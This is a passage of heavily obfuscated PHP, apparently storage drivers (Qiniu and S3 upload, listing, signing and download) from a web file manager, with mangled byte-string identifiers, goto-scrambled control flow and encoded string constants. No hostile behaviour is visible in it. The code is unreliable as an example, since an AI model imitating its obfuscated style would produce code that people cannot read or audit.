$b‘ÌØæ‚ô += count($cŠ”´›¼»›[$AïšÑ°Î³[1282]]); } if ($a‰ÚåÕ·„ === $AïšÑ°Î³[33]) { break; } continue; } if ($dš²ëèà›) { if (!empty($cŠ”´›¼»›[$AïšÑ°Î³[1281]])) { return !0; } } else { if (!empty($cŠ”´›¼»›[$AïšÑ°Î³[1282]])) { return !0; } } if ($a‰ÚåÕ·„ === $AïšÑ°Î³[33]) { break; } } if ($FÕŠ–•”¼Í) { return array($AïšÑ°Î³[201] => $F„İÕëñ±Š, $AïšÑ°Î³[202] => $b‘ÌØæ‚ô); } goto fí°³¦ˆá; cÕÏà°Úéô: $AïšÑ°Î³ =& $_SERVER[òÀöí]; $b£šùÛŠµŒ = trim($b£šùÛŠµŒ, $AïšÑ°Î³[8]); $e‡Ëêâ®« = empty($b£šùÛŠµŒ) ? $AïšÑ°Î³[33] : $b£šùÛŠµŒ . $AïšÑ°Î³[8]; goto EÙ¡ğå¼Ç; EÙ¡ğå¼Ç: $a‰ÚåÕ·„ = $AïšÑ°Î³[33]; $Dì‚£Ù®± = 500; $a»Ô¬ºÁ›× = $AïšÑ°Î³[8]; goto e÷ë„×Š; fí°³¦ˆá: return !1; goto föˆ‘¯èáò; föˆ‘¯èáò: } public function listAll($EÜÌâ…Àå) { $fˆ„¬©îª =& $_SERVER[òÀöí]; $FÊ«œ¼ìëÔ = $this->fileList($EÜÌâ…Àå, $fˆ„¬©îª[33], !0); $A¨ğÖ©Ìè— = array(); foreach ($FÊ«œ¼ìëÔ[$fˆ„¬©îª[73]] as $E“ö·®—­) { $A¨ğÖ©Ìè—[$E“ö·®—­[$fˆ„¬©îª[92]]] = $E“ö·®—­[$fˆ„¬©îª[77]]; } foreach ($FÊ«œ¼ìëÔ[$fˆ„¬©îª[74]] as $E“ö·®—­) { if (is_string($E“ö·®—­)) { $A¨ğÖ©Ìè—[$E“ö·®—­] = 0; } } return $this->listAllFiles($EÜÌâ…Àå, array_keys($A¨ğÖ©Ìè—), $A¨ğÖ©Ìè—); } private function fileList($b¯º¤ÔÓ®Á, $e»ŸéåŞÚ¾ = '', $cÀƒàšµ« = 0) { goto B°ğ¥ˆø¨±; B°ğ¥ˆø¨±: $BœÏßİ„¹ =& $_SERVER[òÀöí]; $b¯º¤ÔÓ®Á = trim($b¯º¤ÔÓ®Á, $BœÏßİ„¹[8]); $Bå—Ë°ˆ¹’ = empty($b¯º¤ÔÓ®Á) ? $BœÏßİ„¹[33] : $b¯º¤ÔÓ®Á . $BœÏßİ„¹[8]; goto c½â•Š†ÁÔ; EÈÊê£äÉ: $b±ä–±èÎÀ = $d¢çùÍ » = array(); while (!0) { check_abort(); list($A´¼•æïà, $B¤¬À‹îÀ‰) = $this->bucketManager->listFiles($this->bucket, $Bå—Ë°ˆ¹’, $Dß¥ñæ´µ, $fÅÏó½ôƒÅ, $e»ŸéåŞÚ¾); if ($B¤¬À‹îÀ‰) { break; } $Dß¥ñæ´µ = array_key_exists($BœÏßİ„¹[1248], $A´¼•æïà) ? $Dß¥ñæ´µ = $A´¼•æïà[$BœÏßİ„¹[1280]] : $BœÏßİ„¹[33]; $EœÀ½›­ËÀ = isset($A´¼•æïà[$BœÏßİ„¹[1281]]) ? $A´¼•æïà[$BœÏßİ„¹[1281]] : array(); $B‹¤ñà‰ = isset($A´¼•æïà[$BœÏßİ„¹[1282]]) ? $A´¼•æïà[$BœÏßİ„¹[1282]] : array(); foreach ($EœÀ½›­ËÀ as $eËßè²ë‰ğ) { goto B½ÄÍù—‘œ; dÜ¢ï‡âŒë: if ($Eº©çƒËË) { $b±ä–±èÎÀ[] = $a¤²Ü‡±²; continue; } $d¢çùÍ »[] = $cÀƒàšµ« ? $eËßè²ë‰ğ : $a¤²Ü‡±²; goto eœ³á±Ü; CæÛÁŞæİ: $eËßè²ë‰ğ[$BœÏßİ„¹[77]] = $E¬Áëö‚§ã; $Eº©çƒËË = $E¬Áëö‚§ã == 0 && substr($a¤²Ü‡±², strlen($a¤²Ü‡±²) - 1, 1) == $BœÏßİ„¹[8] ? !0 : !1; if ($c¹‚ÜŞÒ•Ë) { $this->cacheMethod($BœÏßİ„¹[197], $a¤²Ü‡±², $Eº©çƒËË); $this->cacheMethod($BœÏßİ„¹[198], $a¤²Ü‡±², $eËßè²ë‰ğ); } goto dÜ¢ï‡âŒë; B½ÄÍù—‘œ: if ($eËßè²ë‰ğ[$BœÏßİ„¹[92]] == $Bå—Ë°ˆ¹’) { continue; } $a¤²Ü‡±² = $eËßè²ë‰ğ[$BœÏßİ„¹[92]]; $E¬Áëö‚§ã = $eËßè²ë‰ğ[$BœÏßİ„¹[1278]]; goto CæÛÁŞæİ; eœ³á±Ü: } foreach ($B‹¤ñà‰ as $a¤²Ü‡±²) { if ($a¤²Ü‡±² == $Bå—Ë°ˆ¹’) { continue; } $b±ä–±èÎÀ[] = $a¤²Ü‡±²; if ($c¹‚ÜŞÒ•Ë) { $this->cacheMethod($BœÏßİ„¹[197], $a¤²Ü‡±², !0); } } if ($Dß¥ñæ´µ === $BœÏßİ„¹[33]) { break; } } if ($c¹‚ÜŞÒ•Ë) { $this->cacheMethod($BœÏßİ„¹[197], $b¯º¤ÔÓ®Á, !0); } goto cÅãğ¸’é÷; c½â•Š†ÁÔ: $Dß¥ñæ´µ = $BœÏßİ„¹[33]; $fÅÏó½ôƒÅ = 1000; $c¹‚ÜŞÒ•Ë = $this->listItemCache === !1 ? !1 : !0; goto EÈÊê£äÉ; cÅãğ¸’é÷: return array($BœÏßİ„¹[74] => $b±ä–±èÎÀ, $BœÏßİ„¹[73] => $d¢çùÍ »); goto CÌºÄâˆÙĞ; CÌºÄâˆÙĞ: } public function canRead($d”½×ğƒ‰æ) { return $this->exist($d”½×ğƒ‰æ) ? !0 : !1; } public function canWrite($b’ŒÌ¥‰ñ) { return $this->exist($b’ŒÌ¥‰ñ) ? !0 : !1; } public function getContent($F‹ÀÄÄÅ·) { return $this->fileSubstr($F‹ÀÄÄÅ·, 0, -1); } public function setContent($F„ğ‡»‘¤, $CÍ„¹Í—Œ = '') { $EÅÉØõÏÁ = $this->tempFile($this->pathThis($F„ğ‡»‘¤)); file_put_contents($EÅÉØõÏÁ, $CÍ„¹Í—Œ); if ($this->upload($F„ğ‡»‘¤, $EÅÉØõÏÁ)) { $this->tempFileRemve($EÅÉØõÏÁ); return !0; } return !1; } public function refreshUrls($eñ¡Õ“×²) { goto FÓÓÏ¾Éøç; B½”¬õ…¡³: $aÓ‘Ï£„ = new Qiniu\Cdn\CdnManager($this->auth); list($a§õ‡ÔöÜä, $BŸÑé³Ñ£¨) = $aÓ‘Ï£„->refreshUrls($e‡ä•‚˜îÜ); if ($BŸÑé³Ñ£¨) { return !1; } goto Aä‰¯–ì¯¿; Aä‰¯–ì¯¿: return $a§õ‡ÔöÜä[$b°ÏÈ¿Ë¸«[1056]] == $b°ÏÈ¿Ë¸«[715] ? !0 : !1; goto a›˜“®ÖÃÜ; FÓÓÏ¾Éøç: $b°ÏÈ¿Ë¸« =& $_SERVER[òÀöí]; $e‡ä•‚˜îÜ = array(); if (is_array($eñ¡Õ“×²)) { foreach ($eñ¡Õ“×² as $F°óÄÇ•³í) { $e‡ä•‚˜îÜ[] = $this->link($F°óÄÇ•³í); } } else { $e‡ä•‚˜îÜ[] = $this->link($eñ¡Õ“×²); } goto B½”¬õ…¡³; a›˜“®ÖÃÜ: } public function fileSubstr($d¹æŞ¦ã£Ä, $BŠÍ‹ì‹…Î, $C‘ŠÓÕ•ß) { $Bí–ÔÃƒ‰† =& $_SERVER[òÀöí]; if (!($EÖ×ííßÏ° = $this->link($d¹æŞ¦ã£Ä))) { return !1; } $AØŒ÷•šÒƒ = !1; if ($C‘ŠÓÕ•ß > 0) { $bËÒ”¿Ş·ô = $BŠÍ‹ì‹…Î + $C‘ŠÓÕ•ß - 1; $AØŒ÷•šÒƒ = array($Bí–ÔÃƒ‰†[1283] . $BŠÍ‹ì‹…Î . $Bí–ÔÃƒ‰†[429] . $bËÒ”¿Ş·ô); } $Døª²´­¹¥ = url_request($EÖ×ííßÏ°, $Bí–ÔÃƒ‰†[226], !1, $AØŒ÷•šÒƒ); return $Døª²´­¹¥[$Bí–ÔÃƒ‰†[708]] ? $Døª²´­¹¥[$Bí–ÔÃƒ‰†[1066]] : !1; } public function upload($F¥Î“çßÍ, $b…º…Å²­š, $F‚ˆæ„ãÅÓ = false, $fÂŠÊ ŸÆ = REPEAT_REPLACE) { $BÅŠÌİ–Â = new Qiniu\Storage\UploadManager(); $f¡—À£º²ˆ = $this->auth->uploadToken($this->bucket, $F¥Î“çßÍ); $c„Ç°…Æã = get_file_mime(get_path_ext($b…º…Å²­š)); list($d¥†ˆ…Šä©, $E°ã¾¿»’’) = $BÅŠÌİ–Â->putFile($f¡—À£º²ˆ, $F¥Î“çßÍ, $b…º…Å²­š, null, $c„Ç°…Æã); return $E°ã¾¿»’’ ? !1 : $this->getPathOuter($F¥Î“çßÍ); } public function uploadFormData($DŠ¾ƒ¯³ÂÜ, $Aïø˜®ã‘ = 3600) { return $this->uploadToken($DŠ¾ƒ¯³ÂÜ, $Aïø˜®ã‘); } public function multiUploadFormData($aª°ÕèáŠ”, $fœ—‰‘ğª = 3600) { return $this->uploadToken($aª°ÕèáŠ”, $fœ—‰‘ğª); } private function uploadToken($Bâ¯£–²ø, $e¼¿‰²” = 3600) { goto DŒ…ÁÒØ’; DŒ…ÁÒØ’: $c¶¿º ñ£ =& $_SERVER[òÀöí]; $eÙƒİ…¤ÕŞ = $e¼¿‰²”; $C½ö”ØË™Ë = array($c¶¿º ñ£[1284] => $c¶¿º ñ£[1285]); goto fïì†Åâ×…; f·Œ¸¡ğæÓ: $Bİ™´ßßÈŒ = http_type() . "\72\x2f\x2f\x75\160\154\x6f\141\x64{$aÉ°½ÇìïÒ}\x2e\x71\151\x6e\x69\165\x70\x2e\143\157\x6d\x2f"; return array($c¶¿º ñ£[1287] => $A¥ÏœÜñ£, $c¶¿º ñ£[1288] => $Bİ™´ßßÈŒ); goto fÙ÷³åÔ ˜; fïì†Åâ×…: $dŞ¢¢‚±ô = $Bâ¯£–²ø; $A¥ÏœÜñ£ = $this->auth->uploadToken($this->bucket, $dŞ¢¢‚±ô, $eÙƒİ…¤ÕŞ, $C½ö”ØË™Ë, !0); $aÉ°½ÇìïÒ = empty($this->region) || $this->region == $c¶¿º ñ£[1286] ? $c¶¿º ñ£[33] : $c¶¿º ñ£[429] . $this->region; goto f·Œ¸¡ğæÓ; fÙ÷³åÔ ˜: } public function download($cÇàÙ³ã‘, $fš§çÀñ´‚) { goto F¶ŸÓøÏò·; F¶ŸÓøÏò·: $e’ÕÍ°âó… = IO::getPathInner(IO::mkfile($fš§çÀñ´‚)); if (!($c¼à£¶àà÷ = $this->link($cÇàÙ³ã‘))) { return !1; } $c¨„‹óï²¡ = 0; goto fâ’¯„ ì; fâ’¯„ ì: $cŞ‚Şª¹± = 1024 * 200; $CÌä£˜´¡¿ = fopen($e’ÕÍ°âó…, $_SERVER[òÀöí][1289]); while (!0) { $e™èÔ„ñ¦¢ = $this->fileSubstr($cÇàÙ³ã‘, $c¨„‹óï²¡, $cŞ‚Şª¹±); if ($e™èÔ„ñ¦¢ === !1) { return !1; } fwrite($CÌä£˜´¡¿, $e™èÔ„ñ¦¢); $c¨„‹óï²¡ += $cŞ‚Şª¹±; if (strlen($e™èÔ„ñ¦¢) < $cŞ‚Şª¹±) { break; } } goto dŠæº¶ä¡İ; dŠæº¶ä¡İ: fclose($CÌä£˜´¡¿); return $fš§çÀñ´‚; goto AéÄã…ö¦Ş; AéÄã…ö¦Ş: } public function link($BÂ‰Èå“®Í, $e…«Òó¥¾ß = '') { if (!$this->isFile($BÂ‰Èå“®Í)) { return !1; } $BŞÇä”Í¨µ = $this->getHost() . $_SERVER[òÀöí][8] . $this->pathEncode($BÂ‰Èå“®Í) . $e…«Òó¥¾ß; return $this->auth->privateDownloadUrl($BŞÇä”Í¨µ, 3600 * 12); } public function fileOut($dİÕî›ñ‡Ê, $e¨›œÌ¥ ¨ = false, $E¤ó¿Ôœ®ì = false, $AÕ¶è¦‘Ò = '') { $a•’´ß¼˜è =& $_SERVER[òÀöí]; if ($this->isFileOutServer()) { return $this->fileOutServer($dİÕî›ñ‡Ê, $e¨›œÌ¥ ¨, $E¤ó¿Ôœ®ì, $AÕ¶è¦‘Ò); } if (!$E¤ó¿Ôœ®ì) { $E¤ó¿Ôœ®ì = $this->pathThis($dİÕî›ñ‡Ê); } $A¶‰¹¢·…­ = $e¨›œÌ¥ ¨ ? $a•’´ß¼˜è[1290] . rawurlencode($E¤ó¿Ôœ®ì) : $a•’´ß¼˜è[33]; $C‹à¼èÉƒ = $this->link($dİÕî›ñ‡Ê, $A¶‰¹¢·…­); $this->fileOutLink($C‹à¼èÉƒ); } public function fileOutServer($A¢İ‚è”—³, $f‡òœ¼†² = false, $E¡È©ÜÊÎ = false, $B³–êÀÒÃ = '') { parent::fileOut($A¢İ‚è”—³, $f‡òœ¼†², $E¡È©ÜÊÎ, $B³–êÀÒÃ); } public function fileOutImage($a÷Ñ÷Ú³, $AÆ±»¡†– = 250) { $dÕ²Ô’¨Ç‘ = $this->link($a÷Ñ÷Ú³, $_SERVER[òÀöí][1291] . $AÆ±»¡†–); $this->fileOutLink($dÕ²Ô’¨Ç‘); } public function fileOutImageServer($f´Ç¿¼Ê‰, $B‰Õ®ˆ×áå = 250) { parent::fileOutImage($f´Ç¿¼Ê‰, $B‰Õ®ˆ×áå); } public function hashMd5($C²óßè¸êÍ) { $FÖĞ¢¼á¬ù =& $_SERVER[òÀöí]; $câçã¢íèä = $this->objectMeta($C²óßè¸êÍ); return isset($câçã¢íèä[$FÖĞ¢¼á¬ù[206]]) ? $câçã¢íèä[$FÖĞ¢¼á¬ù[206]] : !1; $eã°ÏÓ—Üò = $this->link($C²óßè¸êÍ, $FÖĞ¢¼á¬ù[1292]); } public function size($Aî«¿œ«ÊÕ) { $cíéÑøÛ¡ƒ = $this->objectMeta($Aî«¿œ«ÊÕ); return $cíéÑøÛ¡ƒ ? $cíéÑøÛ¡ƒ[$_SERVER[òÀöí][77]] : 0; } public function info($FÊöí²–©ñ) { if ($this->isFolder($FÊöí²–©ñ)) { return $this->folderInfo($FÊöí²–©ñ); } else { if ($this->isFile($FÊöí²–©ñ)) { return $this->fileInfo($FÊöí²–©ñ); } } return !1; } public function exist($a³•‚ººÉ) { return $this->isFile($a³•‚ººÉ) || $this->isFolder($a³•‚ººÉ); } public function isFile($D¾šîî‰Úƒ) { return !$this->isFolder($D¾šîî‰Úƒ) && $this->objectMeta($D¾šîî‰Úƒ); } public function isFolder($FÉÎñßî’Í) { return $this->cacheMethod($_SERVER[òÀöí][197], $FÉÎñßî’Í); } protected function objectMeta($c½¬‘ĞìÇÉ) { return $this->cacheMethod($_SERVER[òÀöí][198], $c½¬‘ĞìÇÉ); } protected function _objectMeta($cŒâš„àŞ¯) { $B’ÚÔŸÛó× =& $_SERVER[òÀöí]; list($fÅñâ²‰‚, $cÇ¸ïÁ¥æñ) = $this->bucketManager->stat($this->bucket, $cŒâš„àŞ¯); if ($fÅñâ²‰‚) { $fÅñâ²‰‚[$B’ÚÔŸÛó×[77]] = intval($fÅñâ²‰‚[$B’ÚÔŸÛó×[1278]]); } return $fÅñâ²‰‚; } protected function _isFolder($dØİƒ‡èæ) { $B˜×Ö†ëÉæ =& $_SERVER[òÀöí]; if ($dØİƒ‡èæ == $B˜×Ö†ëÉæ[33] || $dØİƒ‡èæ == $B˜×Ö†ëÉæ[8]) { return !0; } list($BÙæé‚­‹ , $eÖ¯¢²ÀÇê) = $this->bucketManager->listFiles($this->bucket, trim($dØİƒ‡èæ, $B˜×Ö†ëÉæ[8]) . $B˜×Ö†ëÉæ[8], $B˜×Ö†ëÉæ[33], 1, $B˜×Ö†ëÉæ[8]); return !empty($BÙæé‚­‹ [$B˜×Ö†ëÉæ[1281]]) || !empty($BÙæé‚­‹ [$B˜×Ö†ëÉæ[1282]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($e·‘ª…È˜Ë) { parent::__construct($e·‘ª…È˜Ë); } public function uploadFormData($b„«‡Õ, $Fî‡Àšò˜ˆ = 3600) { goto aÀ¢ßç§; BÁÄ×ù¯³«: $Cˆòîœõ = base64_encode(json_encode($c‰‚Ö‹ù²)); $F¸ÁÈ“Ÿ = hash_hmac($a¡ªğ³“Ğ[1208], $Dİˆµç˜š, $a¡ªğ³“Ğ[1209] . $this->secret, !0); $aùŠœÕé‡‚ = hash_hmac($a¡ªğ³“Ğ[1208], $this->region, $F¸ÁÈ“Ÿ, !0); goto f‹Òºî×æ—; AäÃñ¿‘™Ö: $BæèœÂ©£½ = $a¡ªğ³“Ğ[1200]; $BšàÈ„‡Ş´ = $Fî‡Àšò˜ˆ . $a¡ªğ³“Ğ[33]; $aÂ‹Šœ™ºù = $a¡ªğ³“Ğ[1164]; goto Bì›¦Ë«ŠÊ; Bì›¦Ë«ŠÊ: $E»ÊÊ§’ª = array($this->accessKey, $Dİˆµç˜š, $this->region, $E…éÙ¦‘é¸, $BæèœÂ©£½); $aê±œ¼ä±† = implode($a¡ªğ³“Ğ[8], $E»ÊÊ§’ª); $c‰‚Ö‹ù² = array($a¡ªğ³“Ğ[1166] => gmdate($a¡ªğ³“Ğ[1165], strtotime($a¡ªğ³“Ğ[1201])), $a¡ªğ³“Ğ[1167] => array(array($a¡ªğ³“Ğ[1169] => $this->bucket), array($a¡ªğ³“Ğ[1168] => $aá¡ìâÚ­‰), array($a¡ªğ³“Ğ[1170], $a¡ªğ³“Ğ[1171], $a¡ªğ³“Ğ[33]), array($a¡ªğ³“Ğ[1170], $a¡ªğ³“Ğ[1202], $a¡ªğ³“Ğ[33]), array($a¡ªğ³“Ğ[1170], $a¡ªğ³“Ğ[1203], $a¡ªğ³“Ğ[33]), array($a¡ªğ³“Ğ[1172] => $aÂ‹Šœ™ºù), array($a¡ªğ³“Ğ[1204] => $aê±œ¼ä±†), array($a¡ªğ³“Ğ[1205] => $e•´¶ØÚé), array($a¡ªğ³“Ğ[1206] => $aôö—ÌÑ), array($a¡ªğ³“Ğ[1207] => $BšàÈ„‡Ş´))); goto BÁÄ×ù¯³«; eôã½–ŒÍ³: $E…éÙ¦‘é¸ = $a¡ªğ³“Ğ[59]; $aôö—ÌÑ = gmdate($a¡ªğ³“Ğ[1199]); $Dİˆµç˜š = gmdate($a¡ªğ³“Ğ[709]); goto AäÃñ¿‘™Ö; f‹Òºî×æ—: $aÄƒ¿‹†ñ¬ = hash_hmac($a¡ªğ³“Ğ[1208], $E…éÙ¦‘é¸, $aùŠœÕé‡‚, !0); $dİ‰ŒÃ¥³ø = hash_hmac($a¡ªğ³“Ğ[1208], $BæèœÂ©£½, $aÄƒ¿‹†ñ¬, !0); $e³„•›™± = hash_hmac($a¡ªğ³“Ğ[1208], $Cˆòîœõ, $dİ‰ŒÃ¥³ø); goto b¡¡ ¢‘©; b¡¡ ¢‘©: $eÀö‹¿¬“Æ = array($a¡ªğ³“Ğ[209] => $a¡ªğ³“Ğ[33], $a¡ªğ³“Ğ[1210] => $a¡ªğ³“Ğ[33], $a¡ªğ³“Ğ[1168] => $aá¡ìâÚ­‰, $a¡ªğ³“Ğ[1172] => $aÂ‹Šœ™ºù, $a¡ªğ³“Ğ[1176] => $Cˆòîœõ, $a¡ªğ³“Ğ[1211] => $aê±œ¼ä±†, $a¡ªğ³“Ğ[1212] => $e•´¶ØÚé, $a¡ªğ³“Ğ[1213] => $aôö—ÌÑ, $a¡ªğ³“Ğ[1214] => $BšàÈ„‡Ş´, $a¡ªğ³“Ğ[1215] => $e³„•›™±, $a¡ªğ³“Ğ[175] => $this->getHost()); return $eÀö‹¿¬“Æ; goto e¾Ç¡ªè¾ƒ; aÀ¢ßç§: $a¡ªğ³“Ğ =& $_SERVER[òÀöí]; $aá¡ìâÚ­‰ = $a¡ªğ³“Ğ[191]; $e•´¶ØÚé = $a¡ªğ³“Ğ[1198]; goto eôã½–ŒÍ³; e¾Ç¡ªè¾ƒ: } public function multiUploadFormData($cõ¥ô¬·ˆ, $B©ÉŠ›¤Ô = 3600) { $d³Õ¶Í½¦³ =& $_SERVER[òÀöí]; $F…çÕÈƒ÷» = gmdate($d³Õ¶Í½¦³[1293]); $E‡æ²”¦º = array(); $e„À¶Ä°¼ = $this->client->getUploadId($this->bucket, $cõ¥ô¬·ˆ, $E‡æ²”¦º); if (!$e„À¶Ä°¼) { return !1; } return array($d³Õ¶Í½¦³[219] => $e„À¶Ä°¼, $d³Õ¶Í½¦³[175] => $this->getHost() . $d³Õ¶Í½¦³[8] . $this->pathEncode($cõ¥ô¬·ˆ), $d³Õ¶Í½¦³[220] => $F…çÕÈƒ÷», $d³Õ¶Í½¦³[92] => $cõ¥ô¬·ˆ); } public function multiUploadAuthData($dÚÚ”†ùÃ, $cé§¢ÕÁğ“ = array()) { goto B›ÂÜòùƒ¸; cÉáİ¿·¤§: $aÂçÜÅäŞ = $A†Š²†‚‹ö[224]; $CÁ”÷¥²» = $A†Š²†‚‹ö[8] . $this->pathEncode($B›Å›Ä¾‡â) . $aÕƒÛêá¬³; $BàÒÕ•Ÿ = $this->client->__getSignatureV4($EóÖá³äå, $C´Î†Ë®§á, $aÂçÜÅäŞ, $CÁ”÷¥²»); goto DËñß÷Œƒ³; E”Û‘ó¨‡: if (isset($cé§¢ÕÁğ“[$A†Š²†‚‹ö[1294]])) { $EóÖá³äå[$A†Š²†‚‹ö[1295]] = $cé§¢ÕÁğ“[$A†Š²†‚‹ö[1294]]; } $AŞ®Éê±„¤ = explode($A†Š²†‚‹ö[177], $this->getHost()); $C´Î†Ë®§á = array($A†Š²†‚‹ö[1296] => $AŞ®Éê±„¤[1], $A†Š²†‚‹ö[1297] => $A†Š²†‚‹ö[33], $A†Š²†‚‹ö[209] => $A†Š²†‚‹ö[118], $A†Š²†‚‹ö[1210] => $cé§¢ÕÁğ“[$A†Š²†‚‹ö[77]]); goto cÉáİ¿·¤§; BõéƒŒó: unset($cé§¢ÕÁğ“[$A†Š²†‚‹ö[92]]); if (isset($cé§¢ÕÁğ“[$A†Š²†‚‹ö[221]])) { return $this->listUploadParts($B›Å›Ä¾‡â, $cé§¢ÕÁğ“); } $EóÖá³äå = array(); goto E”Û‘ó¨‡; DËñß÷Œƒ³: if (strpos($aÕƒÛêá¬³, $A†Š²†‚‹ö[223]) === 0) { if (isset($EóÖá³äå[$A†Š²†‚‹ö[1295]])) { $E÷ŠæÍéåÑ = $EóÖá³äå[$A†Š²†‚‹ö[1295]]; } else { if (isset($BàÒÕ•Ÿ[$A†Š²†‚‹ö[1295]])) { $E÷ŠæÍéåÑ = $BàÒÕ•Ÿ[$A†Š²†‚‹ö[1295]]; } else { $E÷ŠæÍéåÑ = hash($A†Š²†‚‹ö[1208], $A†Š²†‚‹ö[33]); } } return array($A†Š²†‚‹ö[230] => $BàÒÕ•Ÿ[$A†Š²†‚‹ö[230]], $A†Š²†‚‹ö[1295] => $E÷ŠæÍéåÑ, $A†Š²†‚‹ö[220] => $BàÒÕ•Ÿ[$A†Š²†‚‹ö[1298]]); } return $BàÒÕ•Ÿ[$A†Š²†‚‹ö[230]]; goto Fî“…¥ĞÚÍ; B›ÂÜòùƒ¸: $A†Š²†‚‹ö =& $_SERVER[òÀöí]; $aÕƒÛêá¬³ = isset($cé§¢ÕÁğ“[$A†Š²†‚‹ö[167]]) ? $cé§¢ÕÁğ“[$A†Š²†‚‹ö[167]] : $A†Š²†‚‹ö[33]; $B›Å›Ä¾‡â = $cé§¢ÕÁğ“[$A†Š²†‚‹ö[92]]; goto BõéƒŒó; Fî“…¥ĞÚÍ: } public function listUploadParts($fåÚ‚ó¦Ë¯, $d«°®ÑŠÓ = array()) { goto aøÌŞ¼Ñ”Ë; E™æä¬§Ø: $d©Šá¡ï’Ö = array($AÍÒÔ³Ç·[1296] => $e¬â¹İÎ‚«[1], $AÍÒÔ³Ç·[209] => $AÍÒÔ³Ç·[118], $AÍÒÔ³Ç·[1210] => strlen($e™Ò¸ê¹Ì†)); $c‘ñŠê¾ë™ = $AÍÒÔ³Ç·[222]; $dĞÈÎã‘‡ó = $AÍÒÔ³Ç·[8] . $this->pathEncode($fåÚ‚ó¦Ë¯) . $d«°®ÑŠÓ[$AÍÒÔ³Ç·[167]]; goto a¥Ú«’ÖÎÉ; a¥Ú«’ÖÎÉ: $A×Úå§¯è£ = $this->client->__getSignatureV4($d†ù…‘ô‘¹, $d©Šá¡ï’Ö, $c‘ñŠê¾ë™, $dĞÈÎã‘‡ó, $e™Ò¸ê¹Ì†); return array($AÍÒÔ³Ç·[230] => $A×Úå§¯è£[$AÍÒÔ³Ç·[230]], $AÍÒÔ³Ç·[220] => $A×Úå§¯è£[$AÍÒÔ³Ç·[1298]], $AÍÒÔ³Ç·[232] => $E‚Œ’à§Ò, $AÍÒÔ³Ç·[1295] => $A×Úå§¯è£[$AÍÒÔ³Ç·[1295]]); goto b´†ˆ“¯ ; CŒİØšÔä : if (!$E‚Œ’à§Ò) { return !1; } $e™Ò¸ê¹Ì† = $AÍÒÔ³Ç·[1299]; foreach ($E‚Œ’à§Ò as $C­ÇÅ·˜øÇ) { $e™Ò¸ê¹Ì† .= $AÍÒÔ³Ç·[1300] . "\74\x50\141\x72\x74\x4e\x75\155\142\x65\x72\x3e{$C­ÇÅ·˜øÇ[$AÍÒÔ³Ç·[1255]]}\x3c\x2f\120\141\162\164\116\x75\x6d\142\x65\x72\76\xa" . "\74\105\124\141\147\x3e{$C­ÇÅ·˜øÇ[$AÍÒÔ³Ç·[1256]]}\74\x2f\x45\124\141\x67\x3e\12" . $AÍÒÔ³Ç·[1301]; } goto e ÃŒğíÕ ; e ÃŒğíÕ : $e™Ò¸ê¹Ì† .= $AÍÒÔ³Ç·[1302]; $d†ù…‘ô‘¹ = array(); $e¬â¹İÎ‚« = explode($AÍÒÔ³Ç·[177], $this->getHost()); goto E™æä¬§Ø; aøÌŞ¼Ñ”Ë: $AÍÒÔ³Ç· =& $_SERVER[òÀöí]; $Cë–öÖ„‡î = str_replace($AÍÒÔ³Ç·[231], $AÍÒÔ³Ç·[33], $d«°®ÑŠÓ[$AÍÒÔ³Ç·[167]]); $E‚Œ’à§Ò = $this->client->listParts($this->bucket, $fåÚ‚ó¦Ë¯, $Cë–öÖ„‡î); goto CŒİØšÔä ; b´†ˆ“¯ : } public function link($céˆ²º¡ª°, $Aî£ÏáÂÁ† = array()) { return parent::link($céˆ²º¡ª°, $Aî£ÏáÂÁ†); } public function fileOut($bŸµå¤µ„, $FÙ¨Ä–÷ÙÒ = false, $Eíöœª = false, $D›“ã‘†¿Œ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[òÀöí][1303])) { return parent::fileOutServer($bŸµå¤µ„, $FÙ¨Ä–÷ÙÒ, $Eíöœª, $D›“ã‘†¿Œ); } parent::fileOut($bŸµå¤µ„, $FÙ¨Ä–÷ÙÒ, $Eíöœª, $D›“ã‘†¿Œ); } public function fileOutImage($A³ëÍ”ÁÎè, $DÛÜ‚öá¸ = 250) { if (strstr($this->endpoint, $_SERVER[òÀöí][1303])) { return parent::fileOutImageServer($A³ëÍ”ÁÎè, $DÛÜ‚öá¸); } parent::fileOutImage($A³ëÍ”ÁÎè, $DÛÜ‚öá¸); } public function fileOutLink($f„¡÷àšÒî) { $f°ÉÜ¥ =& $_SERVER[òÀöí]; if (substr($f„¡÷àšÒî, 0, 7) == $f°ÉÜ¥[1179]) { $f„¡÷àšÒî = $f°ÉÜ¥[1180] . substr($f„¡÷àšÒî, 7); } header($f°ÉÜ¥[158] . $f„¡÷àšÒî); die; } public function getHost() { $e˜ƒ‰Àˆ… =& $_SERVER[òÀöí]; $AâëÕ¾ø¿Ä = str_rtrim(parent::getHost(), $e˜ƒ‰Àˆ…[8] . $this->bucket); $AâëÕ¾ø¿Ä = explode($e˜ƒ‰Àˆ…[177], $AâëÕ¾ø¿Ä); return $AâëÕ¾ø¿Ä[0] . $e˜ƒ‰Àˆ…[177] . $this->bucket . $e˜ƒ‰Àˆ…[94] . $AâëÕ¾ø¿Ä[1]; } } goto bŞ§·¼¦²—; bÅÛáŸ•Şß: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\163\x6b\x51\x75\145\165\145\114\x65\x6e\x67\164\150"; const QUEUE_DATA = "\x74\x61\163\153\121\x75\145\165\x65\x44\x61\x74\141"; public static function initTask() { } public static function add($eÑÌ¬œí¾©, $aö°½ôÉ×¦ = array(), $aÏ—¡ê…ˆ« = '', $eª¯ãÜ°©Í = '') { goto cÙ¬İ­íŒª; cÙ¬İ­íŒª: $cö¯£Ïâ¹Ì =& $_SERVER[òÀöí]; if (self::count() >= self::MAX_LENGTH) { return !1; } $aå‘ˆ¥›è… = self::getAll(); goto D²²•­ÄÄÓ; fŸöŒÃø×‹: self::setAll($aå‘ˆ¥›è…); return !0; goto fê–áºó‚; D²²•­ÄÄÓ: if ($eª¯ãÜ°©Í && array_find_by_field($aå‘ˆ¥›è…, $cö¯£Ïâ¹Ì[92], $eª¯ãÜ°©Í)) { return !0; } $aå‘ˆ¥›è…[] = array($cö¯£Ïâ¹Ì[260] => $eÑÌ¬œí¾©, $cö¯£Ïâ¹Ì[1575] => $aö°½ôÉ×¦, $cö¯£Ïâ¹Ì[422] => $aÏ—¡ê…ˆ«, $cö¯£Ïâ¹Ì[92] => $eª¯ãÜ°©Í); write_log($cö¯£Ïâ¹Ì[1576] . $aÏ—¡ê…ˆ«, $cö¯£Ïâ¹Ì[1577]); goto 